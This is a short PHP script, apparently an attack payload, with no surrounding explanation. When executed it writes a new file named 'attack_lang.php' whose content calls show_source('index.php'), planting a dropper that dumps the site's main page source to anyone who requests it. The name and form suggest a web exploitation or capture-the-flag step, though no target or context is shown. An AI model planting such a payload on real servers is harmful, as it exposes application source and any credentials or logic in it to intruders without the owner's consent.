<?php 
$myfile = fopen("attack_lang.php", "w") or die("Unable to open file!");
$txt = "<?php show_source('index.php');?>";
fwrite($myfile, $txt);
fclose($myfile);
?>
